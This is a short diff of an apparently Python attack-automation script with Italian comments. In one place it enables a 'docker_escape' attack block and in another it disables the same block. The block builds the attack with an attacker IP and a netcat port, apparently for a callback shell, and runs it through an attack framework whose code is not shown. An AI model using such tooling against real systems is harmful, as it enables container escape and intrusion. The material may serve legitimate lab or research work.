@@ -96,13 +96,13 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
                             #mc.route_flush()
                             #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
-                            #docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
-                            #docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
-                            #if(docker_escape_success):
-                                #print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
-                            #else:
-                                #print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
-                                #break 
+                            docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
+                            docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
+                            if(docker_escape_success):
+                                print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
+                            else:
+                                print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
+                                break 
 
                         break
                     else:
@@ -189,13 +189,13 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
                             #mc.route_flush()
                             #mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
-                            docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
-                            docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
-                            if(docker_escape_success):
-                                print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
-                            else:
-                                print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
-                                break  
+                            #docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
+                            #docker_escape_success = mc.attempt_attack(docker_escape_attack_object)
+                            #if(docker_escape_success):
+                                #print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
+                            #else:
+                                #print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
+                                #break  
 
                         #break
                     else:
